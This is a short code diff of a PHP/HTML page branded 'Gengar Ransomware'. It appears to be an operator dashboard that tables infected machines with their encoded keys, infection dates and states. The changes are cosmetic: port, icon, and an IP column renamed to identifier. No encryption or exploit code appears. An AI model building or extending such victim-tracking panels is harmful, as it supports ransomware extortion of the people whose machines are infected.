@@ -3,7 +3,7 @@
 
 <!--
     go to root folder
-    php -S localhost:8000
+    php -S localhost:5000
 -->
 
 <head>
@@ -23,7 +23,7 @@
     <nav class="navbar navbar-dark bg-dark" style="box-shadow: 2px 2px 2px 1px rgba(0, 0, 0, 0.2);">
         <div class="container-fluid">
             <a class="navbar-brand" href="#">
-                <i class="fas fa-cloud-moon"></i>
+                <i class="fas fa-ghost"></i>
                 <strong>Gengar</strong> Ransomware
             </a>
         </div>
@@ -33,7 +33,7 @@
         <table class="table">
             <thead class="thead-light">
                 <tr>
-                    <th scope="col" style="text-align: left;">IP Address</th>
+                    <th scope="col" style="text-align: left;">Identifier</th>
                     <th scope="col" style="text-align: left;">Encoded Key</th>
                     <th scope="col" style="text-align: left;">Date of infection</th>
                     <th scope="col" style="text-align: left;">State</th>
@@ -54,7 +54,7 @@
                     foreach ($rows as $row){
                         echo '<tr>';
                         echo '<td>';
-                        echo $row['ip'];
+                        echo $row['id'];
                         echo '</td>';
                         echo '<td>';
                         echo $row['key'];
